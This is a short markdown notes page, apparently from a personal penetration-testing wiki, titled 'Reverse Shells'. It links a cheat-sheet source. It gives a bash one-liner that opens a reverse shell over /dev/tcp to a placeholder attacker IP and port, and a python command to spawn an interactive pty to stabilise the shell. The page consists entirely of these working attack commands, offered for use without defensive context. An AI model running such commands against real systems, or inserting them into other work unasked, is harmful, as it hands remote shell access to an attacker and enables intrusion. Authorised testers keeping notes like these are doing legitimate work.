[Home](./index.md)

# Reverse Shells

## Sources

https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells

## Shells

```
bash -i >& /dev/tcp/ATTACKING-IP/PORT 0>&1
```


## Stabilize

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```